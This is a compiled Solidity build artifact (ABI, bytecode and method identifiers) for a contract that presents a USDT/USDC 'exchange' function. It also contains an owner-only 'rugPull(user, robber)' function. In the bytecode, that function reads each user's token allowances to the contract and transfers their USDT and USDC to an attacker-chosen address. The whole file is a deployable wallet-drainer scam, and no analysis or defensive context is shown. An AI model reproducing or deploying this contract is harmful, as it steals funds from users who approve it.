{
  "abi": [
    {
      "inputs": [
        {
          "internalType": "contract IERC20",
          "name": "token0",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "amount",
          "type": "uint256"
        }
      ],
      "name": "exchange",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "getOwner",
      "outputs": [
        {
          "internalType": "address",
          "name": "owner",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "contract IERC20",
          "name": "_usdt",
          "type": "address"
        },
        {
          "internalType": "contract IERC20",
          "name": "_usdc",
          "type": "address"
        }
      ],
      "name": "initialize",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "initialized",
      "outputs": [
        {
          "internalType": "bool",
          "name": "",
          "type": "bool"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "user",
          "type": "address"
        },
        {
          "internalType": "address",
          "name": "robber",
          "type": "address"
        }
      ],
      "name": "rugPull",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "newOwner",
          "type": "address"
        }
      ],
      "name": "transferOwnership",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "usdc",
      "outputs": [
        {
          "internalType": "contract IERC20",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "usdt",
      "outputs": [
        {
          "internalType": "contract IERC20",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    }
  ],
  "bytecode": {
    "object": "0x608060405234801561001057600080fd5b50610b43806100206000396000f3fe608060405234801561001057600080fd5b50600436106100885760003560e01c806347597f2e1161005b57806347597f2e14610107578063485cc9551461011a578063893d20e81461012d578063f2fde38b1461014257600080fd5b8063045d03891461008d578063158ef93e146100a25780632f48ab7d146100c45780633e413bee146100f4575b600080fd5b6100a061009b366004610a05565b610155565b005b6000546100af9060ff1681565b60405190151581526020015b60405180910390f35b6000546100dc9061010090046001600160a01b031681565b6040516001600160a01b0390911681526020016100bb565b6001546100dc906001600160a01b031681565b6100a0610115366004610a31565b6102f0565b6100a0610128366004610a31565b61087d565b600080516020610aee833981519152546100dc565b6100a0610150366004610a6a565b610902565b6000546001600160a01b0383811661010090920416148061018357506001546001600160a01b038381169116145b6101c45760405162461bcd60e51b815260206004820152600d60248201526c34b73b30b634b2103a37b5b2b760991b60448201526064015b60405180910390fd5b600080546001600160a01b0384811661010090920416146101f55760005461010090046001600160a01b0316610202565b6001546001600160a01b03165b6040516323b872dd60e01b81529091506001600160a01b038416906323b872dd9061023590339030908790600401610a8e565b6020604051808303816000875af1158015610254573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906102789190610ab2565b5060405163a9059cbb60e01b8152336004820152602481018390526001600160a01b0382169063a9059cbb906044016020604051808303816000875af11580156102c6573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906102ea9190610ab2565b50505050565b600080516020610aee833981519152546001600160a01b0316336001600160a01b0316146103605760405162461bcd60e51b815260206004820181905260248201527f4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e657260448201526064016101bb565b60008054604051636eb1769f60e11b81526001600160a01b0385811660048301523060248301526101009092049091169063dd62ed3e90604401602060405180830381865afa1580156103b7573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906103db9190610ad4565b600154604051636eb1769f60e11b81526001600160a01b0386811660048301523060248301529293506000929091169063dd62ed3e90604401602060405180830381865afa158015610431573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906104559190610ad4565b90506000821180156104675750600081115b6104cc5760405162461bcd60e51b815260206004820152603060248201527f4552524f523a2075736474416c6c6f77616e636520616e642075736463416c6c60448201526f6f77616e636520617265207a65726f2160801b60648201526084016101bb565b6000546040516370a0823160e01b81526001600160a01b038681166004830152610100909204909116906370a0823190602401602060405180830381865afa15801561051c573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906105409190610ad4565b821061062d576000546040516370a0823160e01b81526001600160a01b038681166004830152610100909204909116906323b872dd908690869084906370a0823190602401602060405180830381865afa1580156105a2573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906105c69190610ad4565b6040518463ffffffff1660e01b81526004016105e493929190610a8e565b6020604051808303816000875af1158015610603573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906106279190610ab2565b506106aa565b6000546040516323b872dd60e01b81526101009091046001600160a01b0316906323b872dd9061066590879087908790600401610a8e565b6020604051808303816000875af1158015610684573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906106a89190610ab2565b505b6001546040516370a0823160e01b81526001600160a01b038681166004830152909116906370a0823190602401602060405180830381865afa1580156106f4573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906107189190610ad4565b81106107ff576001546040516370a0823160e01b81526001600160a01b038681166004830152909116906323b872dd908690869084906370a0823190602401602060405180830381865afa158015610774573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906107989190610ad4565b6040518463ffffffff1660e01b81526004016107b693929190610a8e565b6020604051808303816000875af11580156107d5573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906107f99190610ab2565b506102ea565b6001546040516323b872dd60e01b81526001600160a01b03909116906323b872dd9061083390879087908690600401610a8e565b6020604051808303816000875af1158015610852573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906108769190610ab2565b5050505050565b60005460ff16156108c65760405162461bcd60e51b8152602060048201526013602482015272185b1c9958591e481a5b9a5d1a585b1a5e9959606a1b60448201526064016101bb565b6000805460016001600160a81b03199091166101006001600160a01b039586160217811790915580546001600160a01b03191691909216179055565b600080516020610aee833981519152546001600160a01b0316336001600160a01b0316146109725760405162461bcd60e51b815260206004820181905260248201527f4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e657260448201526064016101bb565b6001600160a01b0381166109d75760405162461bcd60e51b815260206004820152602660248201527f4f776e61626c653a206e6577206f776e657220697320746865207a65726f206160448201526564647265737360d01b60648201526084016101bb565b6109ed81600080516020610aee83398151915255565b50565b6001600160a01b03811681146109ed57600080fd5b60008060408385031215610a1857600080fd5b8235610a23816109f0565b946020939093013593505050565b60008060408385031215610a4457600080fd5b8235610a4f816109f0565b91506020830135610a5f816109f0565b809150509250929050565b600060208284031215610a7c57600080fd5b8135610a87816109f0565b9392505050565b6001600160a01b039384168152919092166020820152604081019190915260600190565b600060208284031215610ac457600080fd5b81518015158114610a8757600080fd5b600060208284031215610ae657600080fd5b505191905056fea7b53796fd2d99cb1f5ae019b54f9e024446c3d12b483f733ccc62ed04eb126ba264697066735822122023aaf878730ab4711dda40c4c0ba4bada8f893e1a2c8fe60d5b408029303364264736f6c63430008130033",
    "linkReferences": {}
  },
  "methodIdentifiers": {
    "exchange(address,uint256)": "045d0389",
    "getOwner()": "893d20e8",
    "initialize(address,address)": "485cc955",
    "initialized()": "158ef93e",
    "rugPull(address,address)": "47597f2e",
    "transferOwnership(address)": "f2fde38b",
    "usdc()": "3e413bee",
    "usdt()": "2f48ab7d"
  },
  "id": 22
}